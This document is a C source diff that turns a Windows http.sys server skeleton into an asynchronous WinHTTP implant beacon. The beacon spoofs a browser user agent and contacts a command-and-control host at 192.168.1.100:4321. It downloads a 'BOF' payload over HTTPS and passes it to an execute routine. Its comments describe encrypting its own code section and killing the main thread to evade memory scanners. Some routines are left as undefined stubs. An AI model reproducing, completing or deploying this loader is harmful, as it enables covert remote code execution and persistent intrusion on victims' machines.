@@ -1,123 +1,144 @@
 #include <windows.h>
-#include <http.h>
-#pragma comment(lib, "httpapi.lib")
+#include <winhttp.h>
+#include <stdio.h>
 
-#define COMPLETION_KEY_HTTP 1
-#define HTTP_RECEIVE_BUFFER_SIZE 4096
+#pragma comment(lib, "winhttp.lib")
 
-// State machine for the asynchronous operation
-typedef enum _IO_STATE {
-    IoStateReceiveRequest,
-    IoStateSendResponse
-} IO_STATE;
+// -----------------------------------------------------------------------------
+// FORWARD DECLARATIONS
+// -----------------------------------------------------------------------------
+__declspec(code_seg(".stub")) 
+void CALLBACK IocpWakeupCallback(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength);
 
-// Custom context wrapping OVERLAPPED
-typedef struct _HTTP_IO_CONTEXT {
-    OVERLAPPED Overlapped;       // MUST be the first member
-    HANDLE hReqQueue;            // Handle to the HTTP Request Queue
-    IO_STATE State;              // Current state of this operation
-    HTTP_REQUEST_ID RequestId;   // Unique ID assigned by http.sys
-    PCHAR RequestBuffer;         // Raw memory buffer for the HTTP packet
-    ULONG BufferLength;          // Size of the buffer
-    PHTTP_REQUEST pRequest;      // Pointer to the parsed request (mapped inside RequestBuffer)
-} HTTP_IO_CONTEXT, *PHTTP_IO_CONTEXT;
+__declspec(code_seg(".stub"))
+void LockAndHibernate();
 
-DWORD WINAPI WorkerRoutine(LPVOID lpParam) {
-    HANDLE hIocp = (HANDLE)lpParam;
-    DWORD bytesTransferred = 0;
-    ULONG_PTR completionKey = 0;
-    LPOVERLAPPED pOverlapped = NULL;
+__declspec(code_seg(".stub"))
+void UnlockAndExecute(LPVOID pBofBuffer, DWORD dwBofSize); // We will define this later
 
-    while (TRUE) {
-        // CPU transitions to ring 0 and waits for a thread scheduler signal.
-        // Thread state becomes WaitReason = WrQueue.
-        BOOL bRet = GetQueuedCompletionStatus(
-            hIocp, 
-            &bytesTransferred, 
-            &completionKey, 
-            &pOverlapped, 
-            INFINITE
-        );
+// -----------------------------------------------------------------------------
+// ASYNC BEACON PRIMITIVE
+// -----------------------------------------------------------------------------
+BOOL StartAsyncBeacon() {
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
+                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
+                                     WINHTTP_NO_PROXY_NAME, 
+                                     WINHTTP_NO_PROXY_BYPASS, 
+                                     WINHTTP_FLAG_ASYNC); // <- Delegate wait to the kernel
+    if (!hSession) return FALSE;
 
-        if (pOverlapped == NULL) {
-            // Unrecoverable error in IOCP mechanism or thread pool shutdown
-            break; 
-        }
+    // Register the IOCP callback (triggered when the kernel receives network events)
+    WinHttpSetStatusCallback(hSession, 
+                             (WINHTTP_STATUS_CALLBACK)IocpWakeupCallback, 
+                             WINHTTP_CALLBACK_FLAG_ALL_COMPLETIONS, 
+                             0);
 
-        // Recover our full context structure
-        PHTTP_IO_CONTEXT pContext = (PHTTP_IO_CONTEXT)pOverlapped;
+    // Connect to C2
+    HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.1.100", 4321, 0);
+    if (!hConnect) return FALSE;
 
-        if (!bRet) {
-            // I/O failed at the kernel level (e.g., client disconnected abruptly)
-            HeapFree(GetProcessHeap(), 0, pContext->RequestBuffer);
-            HeapFree(GetProcessHeap(), 0, pContext);
-            continue;
-        }
+    // Prepare the GET request for the BOF
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/bof", 
+                                            NULL, WINHTTP_NO_REFERER, 
+                                            WINHTTP_DEFAULT_ACCEPT_TYPES, 
+                                            WINHTTP_FLAG_SECURE); // Use HTTPS
+    if (!hRequest) return FALSE;
 
-        if (completionKey == COMPLETION_KEY_HTTP) {
-            
-            if (pContext->State == IoStateReceiveRequest) {
-                // 1. Process the incoming HTTP Request
-                
-                // pContext->pRequest now contains the parsed HTTP headers/verb
-                // Example: Route to C2 logic based on URL or Verb (GET/POST)
-                /* if (pContext->pRequest->Verb == HttpVerbPOST) {
-                       // Extract payload
-                   }
-                */
+    // Send the request. This returns immediately. Network I/O is handled by the Kernel.
+    // Note: We can pass a custom struct via dwContext (the 5th parameter) to maintain 
+    // our download buffer state across multiple asynchronous callback triggers.
+    BOOL bResult = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    
+    return bResult;
+}
 
-                // 2. Prepare the HTTP Response
-                HTTP_RESPONSE response;
-                ZeroMemory(&response, sizeof(response));
-                response.StatusCode = 200;
-                response.pReason = "OK";
-                response.ReasonLength = 2;
-
-                // 3. Send Response Asynchronously
-                pContext->State = IoStateSendResponse;
-                ZeroMemory(&pContext->Overlapped, sizeof(OVERLAPPED));
-
-                ULONG result = HttpSendHttpResponse(
-                    pContext->hReqQueue,
-                    pContext->pRequest->RequestId,
-                    0,
-                    &response,
-                    NULL,
-                    &bytesTransferred,
-                    NULL,
-                    0,
-                    &pContext->Overlapped, // IOCP will notify us when send is done
-                    NULL
-                );
-
-                if (result != NO_ERROR && result != ERROR_IO_PENDING) {
-                    // Send failed immediately
-                    HeapFree(GetProcessHeap(), 0, pContext->RequestBuffer);
-                    HeapFree(GetProcessHeap(), 0, pContext);
-                }
-
-            } else if (pContext->State == IoStateSendResponse) {
-                // 4. Cleanup after response is sent
-                // At this point, the transaction is complete. 
-                
-                // Memory mechanism: We must either free the context or recycle it 
-                // for the next HttpReceiveHttpRequest.
-                // For robustness, free and re-allocate (or implement a lookaside list to avoid heap fragmentation).
-                
-                HeapFree(GetProcessHeap(), 0, pContext->RequestBuffer);
-                HeapFree(GetProcessHeap(), 0, pContext);
-
-                // IMPORTANT: The main thread or a dedicated listener thread MUST 
-                // continuously post new HttpReceiveHttpRequest calls with new OVERLAPPED 
-                // structures, otherwise the server will stop accepting new requests.
-            }
-        }
+// -----------------------------------------------------------------------------
+// MAIN ENTRY POINT (.text section - will be encrypted)
+// -----------------------------------------------------------------------------
+int main() {
+    // 1. Launch the async network primitive.
+    // The OS takes over C2 communication from here.
+    if (!StartAsyncBeacon()) {
+        // Exit stealthily if the network initialization fails.
+        return -1; 
     }
+
+    // 2. The request is in flight. The C2 will respond.
+    // We do not wait here! We transfer execution to the .stub section.
+    // This function will encrypt the .text section and kill this main thread.
+    LockAndHibernate();
+
+    // 3. Unreachable code.
+    // The main thread is dead. The process is sleeping, managed solely by Kernel IOCP.
     return 0;
 }
 
-int main() {
-
+// -----------------------------------------------------------------------------
+// THE WATCHMAN (.stub section - remains unencrypted / RX)
+// -----------------------------------------------------------------------------
+__declspec(code_seg(".stub")) 
+void CALLBACK IocpWakeupCallback(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength) {
     
-    return 0;
+    // We use a static or context-passed buffer to accumulate the BOF payload
+    // across multiple asynchronous read operations.
+    static LPVOID pDownloadBuffer = NULL; 
+    static DWORD dwTotalDownloaded = 0;
+    DWORD dwBytesAvailable = 0;
+
+    // The WinHTTP Event State Machine
+    switch (dwInternetStatus) {
+
+        case WINHTTP_CALLBACK_STATUS_SENDREQUEST_COMPLETE:
+            // The request was successfully sent to the C2.
+            // We now instruct the kernel to wait for the HTTP response headers.
+            WinHttpReceiveResponse(hInternet, NULL);
+            break;
+
+        case WINHTTP_CALLBACK_STATUS_HEADERS_AVAILABLE:
+            // The server responded and headers are parsed.
+            // We ask the kernel how much data (payload) is currently available to read.
+            WinHttpQueryDataAvailable(hInternet, NULL);
+            break;
+
+        case WINHTTP_CALLBACK_STATUS_DATA_AVAILABLE:
+            // The kernel tells us how many bytes are ready to be read.
+            dwBytesAvailable = *((LPDWORD)lpvStatusInformation);
+
+            if (dwBytesAvailable == 0) {
+                // No more data available. The download is complete!
+                // The BOF is fully in our buffer. 
+                // Now, we must decrypt the .text section and execute the payload.
+                UnlockAndExecute(pDownloadBuffer, dwTotalDownloaded);
+                
+                // Cleanup HTTP handles here...
+                WinHttpCloseHandle(hInternet);
+            } else {
+                // Data is available. Allocate or resize our buffer.
+                // In a real S-tier scenario, avoid basic malloc (MEM_PRIVATE footprint).
+                // Use a pre-allocated region or a custom memory manager.
+                if (!pDownloadBuffer) {
+                    pDownloadBuffer = VirtualAlloc(NULL, dwBytesAvailable, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                } else {
+                    // Reallocation logic goes here... (simplified for the snippet)
+                }
+
+                // Instruct the kernel to read the data chunk asynchronously into our buffer.
+                WinHttpReadData(hInternet, (LPBYTE)pDownloadBuffer + dwTotalDownloaded, dwBytesAvailable, NULL);
+            }
+            break;
+
+        case WINHTTP_CALLBACK_STATUS_READ_COMPLETE:
+            // A chunk of data has been successfully written to our buffer.
+            dwTotalDownloaded += dwStatusInformationLength;
+
+            // Ask the kernel if there is more data remaining in the socket stream.
+            // This loops back to WINHTTP_CALLBACK_STATUS_DATA_AVAILABLE.
+            WinHttpQueryDataAvailable(hInternet, NULL);
+            break;
+            
+        case WINHTTP_CALLBACK_STATUS_REQUEST_ERROR:
+            // Handle network timeouts, connection drops, etc.
+            WinHttpCloseHandle(hInternet);
+            break;
+    }
 }
